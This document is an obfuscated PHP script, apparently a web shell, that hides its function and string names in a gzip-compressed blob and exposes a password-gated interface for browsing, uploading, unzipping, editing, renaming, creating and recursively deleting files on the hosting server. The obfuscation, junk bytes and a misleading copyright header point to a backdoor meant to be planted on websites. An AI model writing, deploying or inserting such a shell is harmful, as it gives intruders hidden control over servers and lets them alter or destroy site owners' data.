<?php 
        /** 
         *-- copyright : https://www.toolfk.com 
         */
          error_reporting(E_ALL^E_NOTICE);define('O0', 'O');�ڔ������㬊�����Ɂ������������Ԗ����ꨌ�������ɯ���Ե�ħ����������®����퇦Œ�����聻�����ܱ��Ͻ��������ի��٫�����������䫆�������;$_GET[O0] = explode('|||', gzinflate(substr('�      �V�r�6}h�߁0�L/�i�q��<�dO��8��C�t8��  m+Q��bIP��X/�]잽 8���%c���g��V?���$���XQ�OJ��p\\>1���T2�Er.d�9�)�^�*i���vY�#b���s[�S8��f�o���bzs~��:�����&Z���:RoR��[��^8x3?�=<<�K�����������z���y��g�Gċ�����ß�����*Tʽ��բ�b��ɿ��.��P�k����T豷պ��uP⻁��3A�f*�I܊��E�MC�&o)�u!^7V\'�We���T�/�^�w��[l��σW�/[hXş����P�e���_�-T�m"��8̈́��*�Ĳ�P�W�I���v��-v��0P�rZkg��x�F��vGЯ�����L�t������L��k1���/3Qp�zه�l�7C���v"��[��][�A�T�u�S���
�#d���IT߇�%,�c�8S���h�o��R�tm7�i���p��¦�)������;��D<M�ݖU��� ]�̝��.��s�;S�$�<�H�m��qT)c#��1�8*��D�;�m�=�^�+� f��N�"��#D��-��#"��\'�8�z^
�|G�T?�γɎ
+�1	�"%�#��rq����˖����U���Q�$�a| z�Ak����ܞ����g�%	4�������y���V�[@a�q`����8�F�����nO4	�i�W������A�w������)般Ẽ��"�Sv�sB�	-fB㳱�8����2|�<G|E��,�ćO�3�hN��&�F�J����=~��\\�)�Q�����{J{����%�\\�����󃡶OI����,�B�o�-x˵R9m�\\� �y7��n�R�m=��7���}��c0|�ܫ�����c7bp��`�d/��4��/�5��}9�@9N3k�|*
  ',0x0a, -8)));����܎�夏���׫���������̋���ɬς�������̺�������ֹ���҈�����߼��;
$_GET{O0}[0]();
$_GET{O0}{0x001}($_GET{O0}[0x0002]);
$_GET{O0}{0x00003}($_GET{O0}[0x000004]);
$rootDir = $_SERVER[$_GET{O0}{0x05}];
function authenticate() {
    if (isset($_SESSION[$_GET{O0}[0x006]]) && $_SESSION[$_GET{O0}[0x006]] === !0) {
        return !0;
    } else {
        return !1;
    }
}
function login() {
    if (isset($_POST[$_GET{O0}{0x0007}])) {
        $O0O = $_GET{O0}[0x00008]($_GET{O0}[0x00008]($_POST[$_GET{O0}{0x0007}]));
        if($O0O == $_GET{O0}{0x000009}) {
            $_SESSION[$_GET{O0}[0x006]] = !0;
            return !0;
        } else {
            echo$_GET{O0}[0x0a].$O0O.$_GET{O0}{0x00b};
            return !1;
        }
    }
}
function displayCurrentPath($OOO) {
    $O000 = $_GET{O0}[0x000c]($_GET{O0}{0x0000d}, $_GET{O0}[0x00000e]($OOO, $_GET{O0}{0x0000d}));
    $O00O = $_GET{O0}{0x0f};
    echo $_GET{O0}[0x0010];
    $O0O0 = !0;
    foreach ($O000  as  $O0OO) {
        if ($O0OO !== $_GET{O0}{0x0f}) {
            if (!$O0O0) {
                $O00O .= $_GET{O0}{0x0000d};
            } else {
                $O0O0 = !1;
            }
            $O00O .= $O0OO;
            echo $_GET{O0}{0x00011} . $_GET{O0}[0x000012]($O00O) . $_GET{O0}{0x0000013} . $_GET{O0}[0x014]($O0OO) . $_GET{O0}{0x0015};
        }
    }
    echo $_GET{O0}[0x00016];
}
function displayBackButton($OO0O) {
    echo $_GET{O0}{0x000017} . $_GET{O0}[0x000012]($OO0O) . $_GET{O0}[0x0000018];
}
function processDirectory($OOOO)
{
    $OOOO = $_GET{O0}{0x019}($_GET{O0}[0x001a], $_GET{O0}{0x0000d}, $OOOO);
    $OOOO = $_GET{O0}{0x0001b}($_GET{O0}[0x00001c], $_GET{O0}{0x000001d}, $OOOO);
    $OOOO = $_GET{O0}{0x0001b}($_GET{O0}[0x01e], $_GET{O0}{0x000001d}, $OOOO);
    $OOOO = $_GET{O0}{0x0001b}($_GET{O0}{0x001f}, $_GET{O0}{0x000001d}, $OOOO);
    $OOOO = $_GET{O0}{0x0001b}($_GET{O0}[0x00020], $_GET{O0}{0x0000d}, $OOOO);
    $OOOO = $_GET{O0}{0x0001b}($_GET{O0}{0x000021}, $_GET{O0}[0x0000022], $OOOO);

    return $OOOO;
}
function listFiles($O000O) {
    $O00O0 = $_GET{O0}{0x023}($O000O);
    $O00OO = @$_GET{O0}[0x0024]($O00O0);
    if ($O00OO === !1) {
        $O000O = $_SERVER[$_GET{O0}{0x05}];
        $O000O = $_GET{O0}{0x023}($O000O);
        $O00OO = @$_GET{O0}[0x0024]($O000O);
    }
    if (!$_GET{O0}{0x00025}($O00OO)) $O00OO = array();
    $O00O0 = array();
    $O0O00 = array();
    foreach ($O00OO  as  $O0O0O) {
        if ($O0O0O != $_GET{O0}[0x000026] && $O0O0O != $_GET{O0}{0x0000027}) {
            if ($_GET{O0}[0x028]($O000O . $_GET{O0}{0x0000d} . $O0O0O)) {
                $O00O0[] = $O0O0O;
            } else {
                $O0O00[] = $O0O0O;
            }
        }
    }
    $_GET{O0}{0x0029}($O000O);
    foreach ($O00O0  as  $O0O0O) {
        echo $_GET{O0}[0x0002a];
        echo $_GET{O0}{0x00002b} . $_GET{O0}[0x000012]($O000O . $_GET{O0}{0x0000d} . $O0O0O) . $_GET{O0}[0x000002c] . $_GET{O0}[0x014]($O0O0O) . $_GET{O0}{0x02d};
        echo $_GET{O0}[0x002e] . $_GET{O0}[0x000012]($O000O . $_GET{O0}{0x0000d} . $O0O0O) . $_GET{O0}{0x0002f} . $_GET{O0}[0x000012]($O000O) . $_GET{O0}[0x000030];
        echo $_GET{O0}{0x0000031} . $_GET{O0}[0x000012]($O000O . $_GET{O0}{0x0000d} . $O0O0O) . $_GET{O0}{0x0002f} . $_GET{O0}[0x000012]($O000O) . $_GET{O0}[0x032];
        echo $_GET{O0}{0x0033};
    }
    foreach ($O0O00  as  $O0O0O) {
        echo $_GET{O0}[0x0002a];
        echo $_GET{O0}[0x014]($O0O0O);
        echo $_GET{O0}[0x00034] . $_GET{O0}[0x000012]($O000O . $_GET{O0}{0x0000d} . $O0O0O) . $_GET{O0}{0x0002f} . $_GET{O0}[0x000012]($O000O) . $_GET{O0}{0x000035};
        echo $_GET{O0}[0x002e] . $_GET{O0}[0x000012]($O000O . $_GET{O0}{0x0000d} . $O0O0O) . $_GET{O0}{0x0002f} . $_GET{O0}[0x000012]($O000O) . $_GET{O0}[0x000030];
        echo $_GET{O0}{0x0000031} . $_GET{O0}[0x000012]($O000O . $_GET{O0}{0x0000d} . $O0O0O) . $_GET{O0}{0x0002f} . $_GET{O0}[0x000012]($O000O) . $_GET{O0}[0x032];
        if ($_GET{O0}[0x0000036]($O0O0O, PATHINFO_EXTENSION) == $_GET{O0}{0x037}) {
            echo $_GET{O0}[0x0038] . $_GET{O0}[0x000012]($O000O . $_GET{O0}{0x0000d} . $O0O0O) . $_GET{O0}{0x0002f} . $_GET{O0}[0x000012]($O000O) . $_GET{O0}{0x00039};
        }
        echo $_GET{O0}{0x0033};
    }
    echo $_GET{O0}[0x00003a];
    echo $_GET{O0}{0x000003b} . $_GET{O0}[0x000012]($O000O) . $_GET{O0}[0x03c];
    echo $_GET{O0}{0x003d} . $_GET{O0}[0x000012]($O000O) . $_GET{O0}[0x0003e];
}
function uploadFile($O0OOO) {
    if (isset($_FILES[$_GET{O0}{0x00003f}])) {
        $_GET{O0}[0x0000040]($_FILES[$_GET{O0}{0x00003f}][$_GET{O0}{0x041}], $O0OOO . $_GET{O0}{0x0000d} . $_FILES[$_GET{O0}{0x00003f}][$_GET{O0}[0x0042]]);
        echo $_GET{O0}{0x00043};
    }
    echo $_GET{O0}[0x000044];
    echo $_GET{O0}{0x0000045};
    echo $_GET{O0}[0x046];
    echo $_GET{O0}{0x0047};
    echo $_GET{O0}[0x00048];
}
function unzipFile($OO00O, $OO0O0) {
    if ($_GET{O0}{0x000049}($_GET{O0}[0x000004a])) {
        $OO0OO = new ZipArchive;
        if ($OO0OO->$_GET{O0}{0x04b}($OO00O) === !0) {
            $OO0OO->$_GET{O0}[0x004c]($OO0O0);
            $OO0OO->$_GET{O0}{0x0004d}();
            echo $_GET{O0}{0x00043};
        } else {
            echo $_GET{O0}[0x00004e];
        }
    } else {
        try {
            $OOO00 = new $_GET{O0}{0x000004f}($OO00O);
            $OOO00->$_GET{O0}[0x004c]($OO0O0);
            echo $_GET{O0}{0x00043};
        } catch (Exception $OOO0O) {
            echo $_GET{O0}[0x050] . $OOO0O->$_GET{O0}{0x0051}();
        }
    }
}
function editFile($OOOOO) {
    if (isset($_POST[$_GET{O0}[0x00052]])) {
        $_GET{O0}{0x000053}($OOOOO, $_POST[$_GET{O0}[0x00052]]);
        echo $_GET{O0}{0x00043};
    }
    $O00000 = $_GET{O0}[0x0000054]($OOOOO);
    echo $_GET{O0}{0x055};
    echo $_GET{O0}[0x0056] . $_GET{O0}[0x014]($O00000) . $_GET{O0}{0x00057};
    echo $_GET{O0}[0x000058];
    echo $_GET{O0}[0x00048];
}
function renameFile($O000O0) {
    if (isset($_POST[$_GET{O0}{0x0000059}])) {
        $O000OO = $_GET{O0}[0x0000036]($O000O0);
        $_GET{O0}[0x05a]($O000O0, $O000OO[$_GET{O0}{0x005b}] . $_GET{O0}{0x0000d} . $_POST[$_GET{O0}{0x0000059}]);
        echo $_GET{O0}{0x00043};
    }
    echo $_GET{O0}{0x055};
    echo $_GET{O0}[0x0005c];
    echo $_GET{O0}{0x00005d};
    echo $_GET{O0}[0x00048];
}
function deleteFile($O00O0O) {
    if (isset($_POST[$_GET{O0}[0x000005e]]) && $_POST[$_GET{O0}[0x000005e]] == $_GET{O0}{0x05f}) {
        if ($_GET{O0}[0x028]($O00O0O)) {
            $O00OO0 = $_GET{O0}[0x0060]($_GET{O0}[0x0024]($O00O0O), array($_GET{O0}[0x000026], $_GET{O0}{0x0000027}));
            foreach ($O00OO0  as  $O00OOO) {
                $O0O000 = $O00O0O . $_GET{O0}{0x0000d} . $O00OOO;
                if ($_GET{O0}[0x028]($O0O000)) {
                    $_GET{O0}{0x00061}($O0O000);
                } else {
                    $_GET{O0}[0x000062]($O0O000);
                }
            }
            $_GET{O0}{0x0000063}($O00O0O);
        } else {
            $_GET{O0}[0x000062]($O00O0O);
        }
        echo $_GET{O0}{0x00043};
        return;
    }
    echo $_GET{O0}[0x064] . $_GET{O0}[0x014]($O00O0O) . $_GET{O0}{0x0065};
    echo $_GET{O0}{0x055};
    echo $_GET{O0}[0x00066];
    echo $_GET{O0}{0x000067};
    echo $_GET{O0}[0x0000068];
}
function deleteDirectory($O0O0O0) {
    if (!$_GET{O0}[0x028]($O0O0O0)) {
        return !1;
    }
    $O0O0OO = $_GET{O0}[0x0060]($_GET{O0}[0x0024]($O0O0O0), array($_GET{O0}[0x000026], $_GET{O0}{0x0000027}));
    foreach ($O0O0OO  as  $O0OO00) {
        $O0OO0O = $O0O0O0 . $_GET{O0}{0x0000d} . $O0OO00;
        if ($_GET{O0}[0x028]($O0OO0O)) {
            $_GET{O0}{0x00061}($O0OO0O);
        } else {
            $_GET{O0}[0x000062]($O0OO0O);
        }
    }
    return $_GET{O0}{0x0000063}($O0O0O0);
}
function createFile($O0OOOO) {
    if (isset($_POST[$_GET{O0}{0x069}]) && !empty($_POST[$_GET{O0}{0x069}])) {
        $OO0000 = $O0OOOO . $_GET{O0}{0x0000d} . $_POST[$_GET{O0}{0x069}];
        $_GET{O0}{0x000053}($OO0000, $_GET{O0}{0x0f});
        echo $_GET{O0}{0x00043};
    }
    echo $_GET{O0}{0x055};
    echo $_GET{O0}[0x006a];
    echo $_GET{O0}{0x0006b};
    echo $_GET{O0}[0x00048];
}
if (isset($_POST[$_GET{O0}{0x0007}])) {
    $_GET{O0}[0x00006c]();
}
if (!$_GET{O0}{0x000006d}()) {
    echo $_GET{O0}[0x06e];
    echo $_GET{O0}{0x055};
    echo $_GET{O0}{0x006f};
    echo $_GET{O0}[0x00070];
    echo $_GET{O0}[0x00048];
    exit;
}
$O0OOOO = isset($_GET[$_GET{O0}{0x000071}]) ? $_GET[$_GET{O0}{0x000071}] : $_GET{O0}{0x0f}.$OO000O.$_GET{O0}{0x0f};
if (isset($_GET[$_GET{O0}[0x0000072]])) {
    $OO00O0 = $_GET[$_GET{O0}[0x0000072]];
    $OO0000 = isset($_GET[$_GET{O0}{0x00003f}]) ? $_GET[$_GET{O0}{0x00003f}] : null;

    switch ($OO00O0) {
        case $_GET{O0}{0x073}:
            $_GET{O0}[0x0074]($O0OOOO);
            $_GET{O0}{0x00075}($O0OOOO);
            break;
        case $_GET{O0}[0x000076]:
            $_GET{O0}{0x0000077}($OO0000, $O0OOOO);
            $_GET{O0}{0x00075}($O0OOOO);
            break;
        case $_GET{O0}[0x078]:
            $_GET{O0}{0x0079}($OO0000);
            $_GET{O0}{0x00075}($O0OOOO);
            break;
        case $_GET{O0}[0x0007a]:
            $_GET{O0}{0x00007b}($OO0000);
            $_GET{O0}{0x00075}($O0OOOO);
            break;
        case $_GET{O0}[0x000007c]:
            $_GET{O0}{0x07d}($OO0000);
            $_GET{O0}{0x00075}($O0OOOO);
            break;
        case $_GET{O0}[0x007e]:
            $_GET{O0}{0x0007f}($O0OOOO);
            $_GET{O0}{0x00075}($O0OOOO);
            break;
        default:
            $_GET{O0}[0x000080]($O0OOOO);
            $_GET{O0}{0x00075}($_GET{O0}{0x0000081}($O0OOOO));
            break;
    }
} else {
    $_GET{O0}[0x000080]($O0OOOO);
    $_GET{O0}{0x00075}($_GET{O0}{0x0000081}($O0OOOO));
}
?>
